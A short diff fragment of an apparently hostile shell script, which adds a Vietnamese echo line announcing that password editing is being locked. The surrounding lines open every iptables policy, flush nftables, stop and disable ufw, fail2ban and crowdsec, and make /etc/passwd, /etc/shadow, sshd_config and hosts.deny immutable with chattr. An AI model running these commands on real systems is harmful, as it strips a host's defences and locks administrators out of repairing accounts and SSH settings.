@@ -24,6 +24,9 @@ iptables -P INPUT ACCEPT && iptables -P FORWARD ACCEPT && iptables -P OUTPUT ACC
 nft flush ruleset &>/dev/null
 systemctl stop ufw fail2ban crowdsec &>/dev/null
 systemctl disable ufw fail2ban crowdsec &>/dev/null
+
+
+echo "[!] Đang Khóa Chỉnh Sửa Passwd"
 chattr +i /etc/passwd /etc/shadow /etc/ssh/sshd_config /etc/hosts.deny 2>/dev/null
 
 
